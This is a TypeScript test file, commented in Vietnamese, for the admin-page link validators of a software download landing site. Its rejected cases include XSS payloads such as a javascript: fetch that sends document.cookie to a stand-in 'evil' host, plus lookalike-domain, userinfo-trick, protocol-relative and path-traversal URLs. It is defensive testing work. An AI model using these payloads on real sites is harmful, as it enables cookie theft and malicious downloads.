/**
 * Test cho bộ kiểm `href` của trang quản trị (finding C-6).
 *
 * Chạy:  cd landing && node --experimental-strip-types scripts/kiem-tra-lien-ket.test.ts
 *
 * Cố ý KHÔNG dùng framework test: `landing/` chưa có bộ test nào, và việc này
 * chỉ cần một tệp chạy được bằng node có sẵn. Thoát mã 1 khi có ca sai, để
 * dùng được trong CI sau này.
 */

import {
  kiemTraDanhSachTaiVe,
  kiemTraLienKetHoTro,
  kiemTraLienKetTaiVe,
  kiemTraNhomThayDoi,
} from "../src/lib/admin/kiem-tra-lien-ket.ts";

let dat = 0;
let hong = 0;

function ktra(ten: string, thuc: boolean, mong: boolean) {
  if (thuc === mong) {
    dat++;
    console.log(`  dat  | ${ten}`);
  } else {
    hong++;
    console.log(`  HONG | ${ten}  (mong ${mong ? "hop le" : "bi tu choi"}, thuc te nguoc lai)`);
  }
}

const tepMau = (href: string) => [
  {
    id: "full",
    tag: "Bản đầy đủ",
    title: "Bộ cài đầy đủ",
    summary: "Cài mới hoặc cài đè",
    fileName: "qlgx_4_0_2.exe",
    size: "42 MB",
    href,
    primary: true,
    cta: "Tải phần mềm",
  },
];

console.log("== Nut tai phan mem (kiemTraLienKetTaiVe) ==");
for (const href of [
  "/api/tai-ve/full",
  "/api/tai-ve/phien-ban-cu/4.0.1",
  "https://raw.githubusercontent.com/khoannd/qlgx_bin/master/Release/qlgx_4_0_2.exe",
]) {
  ktra(`cho phep: ${href}`, kiemTraLienKetTaiVe(href).hopLe, true);
}
for (const href of [
  "javascript:fetch('https://evil/?c='+document.cookie)",
  "JavaScript:alert(1)",
  "  javascript:alert(1)",
  "java\nscript:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "https://ten-mien-la.example/qlgx.exe",
  "https://raw.githubusercontent.com/ke-tan-cong/qlgx_bin/master/qlgx.exe",
  "https://raw.githubusercontent.evil.example/khoannd/qlgx.exe",
  "https://raw.githubusercontent.com@evil.example/khoannd/qlgx.exe",
  "http://raw.githubusercontent.com/khoannd/qlgx.exe",
  "//evil.example/qlgx.exe",
  "/\\evil.example/qlgx.exe",
  "/api/tai-ve/../../admin",
  "/tai-ve/full",
  "",
]) {
  ktra(`tu choi: ${JSON.stringify(href)}`, kiemTraLienKetTaiVe(href).hopLe, false);
}

console.log("== Lien ket ho tro (kiemTraLienKetHoTro) ==");
for (const href of [
  "/huong-dan/cai-dat",
  "#faq",
  "https://forum.quanlygiaoxu.net",
  "https://www.facebook.com/qlgx2013",
  "mailto:hotro@quanlygiaoxu.net",
]) {
  ktra(`cho phep: ${href}`, kiemTraLienKetHoTro(href).hopLe, true);
}
for (const href of [
  "javascript:alert(document.cookie)",
  "data:text/html;base64,PHNjcmlwdD4=",
  "vbscript:msgbox(1)",
  "https://evil.example/lua-dao",
  "http://forum.quanlygiaoxu.net",
  "//evil.example",
  "https://user:pass@forum.quanlygiaoxu.net",
  "mailto:khong-phai-email",
  "",
]) {
  ktra(`tu choi: ${JSON.stringify(href)}`, kiemTraLienKetHoTro(href).hopLe, false);
}

console.log("== Danh sach tai ve (kiem ca luoc do) ==");
ktra("danh sach hop le", kiemTraDanhSachTaiVe(tepMau("/api/tai-ve/full")).hopLe, true);
ktra(
  "danh sach co href doc",
  kiemTraDanhSachTaiVe(tepMau("https://ten-mien-la.example/qlgx.exe")).hopLe,
  false,
);
ktra("khong phai mang", kiemTraDanhSachTaiVe({ href: "/api/tai-ve/full" }).hopLe, false);
ktra("mang rong", kiemTraDanhSachTaiVe([]).hopLe, false);
ktra("thieu truong fileName", kiemTraDanhSachTaiVe([{ href: "/api/tai-ve/full" }]).hopLe, false);

console.log("== Nhom thay doi ==");
ktra(
  "nhom hop le",
  kiemTraNhomThayDoi([{ id: "moi", title: "Tính năng mới", icon: "download", items: ["a"] }]).hopLe,
  true,
);
ktra(
  "icon la",
  kiemTraNhomThayDoi([{ id: "moi", title: "T", icon: "evil", items: [] }]).hopLe,
  false,
);
ktra("nhom rong van hop le (mang rong)", kiemTraNhomThayDoi([]).hopLe, true);

console.log(`\nTong: ${dat} dat, ${hong} hong`);
if (hong > 0) process.exit(1);
